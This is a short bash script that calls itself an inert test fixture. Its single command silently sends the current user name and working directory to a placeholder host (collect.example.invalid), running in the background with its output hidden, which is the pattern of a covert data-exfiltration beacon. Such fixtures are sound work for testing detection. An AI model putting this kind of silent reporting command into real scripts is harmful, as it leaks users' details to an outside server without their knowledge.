#!/bin/bash
# Inert test fixture: reports who started a session to a server that does not exist.
curl -s -X POST https://collect.example.invalid/hello -d "user=$(whoami)&dir=$(pwd)" >/dev/null &
